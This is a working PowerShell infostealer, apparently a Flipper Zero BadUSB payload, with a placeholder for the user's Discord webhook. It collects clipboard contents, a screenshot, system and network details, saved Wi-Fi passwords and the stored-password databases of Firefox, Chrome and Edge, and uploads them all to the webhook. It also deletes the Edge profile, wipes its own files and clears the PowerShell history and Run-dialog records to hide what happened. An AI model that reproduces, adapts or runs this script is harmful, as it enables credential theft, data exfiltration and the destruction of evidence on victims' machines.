#CHANGE URL TO YOUR URL
  $url="https://discord.com/api/webhooks/XXXXXXXXXXXXXXXXXXXX/XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX" ;
#Get PC Name+Date+Time
  $namepc = Get-Date -UFormat "$env:computername-$env:UserName-%m-%d-%Y_%H-%M-%S"

# Get PC ClipBoard
  echo "" > "$env:temp\stats-$namepc.txt";
  echo "####PC ClipBoard under this line:" >> "$env:temp\stats-$namepc.txt";
  echo "####################################" >> "$env:temp\stats-$namepc.txt";
  Get-Clipboard >> "$env:temp\stats-$namepc.txt";
  echo "####################################" >> "$env:temp\stats-$namepc.txt";
  echo "####End ClipBoard" >> "$env:temp\stats-$namepc.txt";

# Get WifiPassword
echo "" > "$env:temp\WIFI-$namepc.txt";
(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | out-file "$env:temp\WIFI-$namepc.txt";

# Screenshot
  cd "$env:temp";
  echo 'function Get-ScreenCapture' > "d.ps1";
  echo '{' >> "d.ps1";
  echo '    begin {' >> "d.ps1";
  echo '        Add-Type -AssemblyName System.Drawing, System.Windows.Forms' >> "d.ps1";
  echo '        Add-Type -AssemblyName System.Drawing' >> "d.ps1";
  echo '        $jpegCodec = [Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() |' >> "d.ps1";
  echo '            Where-Object { $_.FormatDescription -eq "JPEG" }' >> "d.ps1";
  echo '    }' >> "d.ps1";
  echo '    process {' >> "d.ps1";
  echo '        Start-Sleep -Milliseconds 44' >> "d.ps1";
  echo '            [Windows.Forms.Sendkeys]::SendWait("{PrtSc}")' >> "d.ps1";
  echo '        Start-Sleep -Milliseconds 550' >> "d.ps1";
  echo '        $bitmap = [Windows.Forms.Clipboard]::GetImage()' >> "d.ps1";
  echo '        $ep = New-Object Drawing.Imaging.EncoderParameters' >> "d.ps1";
  echo '        $ep.Param[0] = New-Object Drawing.Imaging.EncoderParameter ([System.Drawing.Imaging.Encoder]::Quality, [long]100)' >> "d.ps1";
  echo '        $screenCapturePathBase = $env:temp + "\" + $env:UserName + "_Capture"' >> "d.ps1";
  echo '        $bitmap.Save("${screenCapturePathBase}.jpg", $jpegCodec, $ep)' >> "d.ps1";
  echo '    }' >> "d.ps1";
  echo '}' >> "d.ps1";
  echo 'Get-ScreenCapture' >> "d.ps1";
  $screencapture = echo $env:temp"\"$env:UserName"_Capture"
  powershell -c $env:temp\d.ps1;
  $Screencap = "$env:temp\d.ps1";

# Get PC information
  dir env: >> "$env:temp\stats-$namepc.txt";
# Get public IP
  $pubip = (Invoke-WebRequest -UseBasicParsing -uri "http://ifconfig.me/").Content
  echo "PUBLIC IP: $pubip" >> "$env:temp\stats-$namepc.txt";
# Get Local IP
  ipconfig /all >> "$env:temp\stats-$namepc.txt";
# List all installed Software
  echo "Installed Software:" >> "$env:temp\stats-$namepc.txt";
  Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -AutoSize >> "$env:temp\stats-$namepc.txt";
  Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -AutoSize >> "$env:temp\stats-$namepc.txt";

# Get FireFox Password
  #firefox ZIP
    Add-Type -Assembly "System.IO.Compression.FileSystem" ;
  #Kill Firefox
    taskkill /IM firefox.exe /F
  #search key4.db and logins.json
  $key4 = Get-Childitem -Path $env:appdata\Mozilla\Firefox\Profiles\ -Include key4.db -Recurse -ErrorAction SilentlyContinue | % { $_.fullname }
  $logins = Get-Childitem -Path $env:appdata\Mozilla\Firefox\Profiles\ -Include logins.json -Recurse -ErrorAction SilentlyContinue | % { $_.fullname }
  #Compress firefox files where stored passwords
  $compress = @{
    Path = "$key4", "$logins"
    CompressionLevel = "Fastest"
    DestinationPath = "$env:temp\Firefox-Password-$namepc.zip"
  }
  Compress-Archive @compress -Update
#Define zip to copy
$firefoxpassword = "$env:temp\Firefox-Password-$namepc.zip"

#Get Chrome Password
  #Chrome ZIP
    Add-Type -Assembly "System.IO.Compression.FileSystem";
  #Kill Chrome
    taskkill /IM chrome.exe /F
    sleep 1
  #Compress chrome files where stored passwords
  $compress = @{
    Path = "$env:appdata\..\local\Google\Chrome\User Data\Local State", "$env:appdata\..\local\Google\Chrome\User Data\default\Login Data", "$env:appdata\..\local\Google\Chrome\User Data\default\Preferences"
    CompressionLevel = "Fastest"
    DestinationPath = "$env:temp\Chrome-Password-$namepc.zip"
  }
  Compress-Archive @compress -Update
  sleep 1
#Define zip to copy
$chromepassword = "$env:temp\Chrome-Password-$namepc.zip"

#Get Edge Password
  #Edge ZIP
    Add-Type -Assembly "System.IO.Compression.FileSystem" ;
  #Kill Edge
    taskkill /IM msedge.exe /F
    sleep 1
  #Compress Edge files where stored passwords
  $compress = @{
    Path = "$env:appdata\..\Local\Microsoft\Edge\User Data\Local State", "$env:appdata\..\Local\Microsoft\Edge\User Data\default\Login Data", "$env:appdata\..\Local\Microsoft\Edge\User Data\default\Preferences"
    CompressionLevel = "Fastest"
    DestinationPath = "$env:temp\Edge-Password-$namepc.zip"
  }
  Compress-Archive @compress -Update
  sleep 1
#Define zip to copy
$edgepassword = "$env:temp\Edge-Password-$namepc.zip"

#UPLOAD
cd $env:temp
# Send Name Computer to discord
  $Body=@{ content = "**Stats from Flipper-Zero on user:** $env:UserName, on pc: $env:computername"};
  Invoke-RestMethod -ContentType 'Application/Json' -Uri $url  -Method Post -Body ($Body | ConvertTo-Json);
# Upload Stat
  curl.exe -F "file1=@stats-$namepc.txt" $url;
# Upload wifi password
  curl.exe -F "file2=@WIFI-$namepc.txt" $url;

# Upload Webbroser Password Pwned
  $Body=@{ content = "**Web Browsers Password Pwned**"};
  Invoke-RestMethod -ContentType 'Application/Json' -Uri $url  -Method Post -Body ($Body | ConvertTo-Json);
# Upload firefox password
  curl.exe -i -F file=@"$firefoxpassword" $url
# Upload chrome password
  curl.exe -i -F file=@"$chromepassword" $url
# Upload Edge password
  curl.exe -i -F file=@"$edgepassword" $url
# Upload screenshot
  sleep 1
  $Body=@{ content = "**Screen Capture before attack start**"};
  Invoke-RestMethod -ContentType 'Application/Json' -Uri $url  -Method Post -Body ($Body | ConvertTo-Json);
  curl.exe -F "file2=@$screencapture.jpg" $url;

# Remove Edge clear configuration
  # Kill again and agan Edge after flipper zero get the token
  taskkill /IM msedge.exe /F
  Remove-Item  $env:APPDATA\..\Local\Microsoft\Edge -Force -Recurse;
  sleep 2
  Remove-Item  $env:APPDATA\..\Local\Microsoft\Edge -Force -Recurse;
  # Restore Edge configuration
  mv $env:APPDATA\..\Local\Microsoft\ZZZZZZZ $env:APPDATA\..\Local\Microsoft\Edge

#Delete all file
# Delete stat
  Remove-Item "stats-$namepc.txt" -Force -Recurse;
# Delete wifi password
  Remove-Item "WIFI-$namepc.txt" -Force -Recurse;
# Delete screenshot
  Remove-Item  $screencapture* -Force -Recurse;
# Delete token screencapture
  Remove-Item  $tokencapture* -Force -Recurse;
# Delete firefox password
  Remove-Item  $firefoxpassword -Force -Recurse;
# Delete Chrome password
  Remove-Item  $chromepassword -Force -Recurse;
# Delete Edge password
  Remove-Item  $edgepassword -Force -Recurse;
# Delete this script
  Remove-Item  $env:temp\e.ps1 -Force -Recurse;
# Delete screencapture script
  Remove-Item $env:temp\d.ps1 -Force -Recurse;

# Clear History powershell:
  [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory();
# Clear run powershell:
  Remove-Item HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
exit;
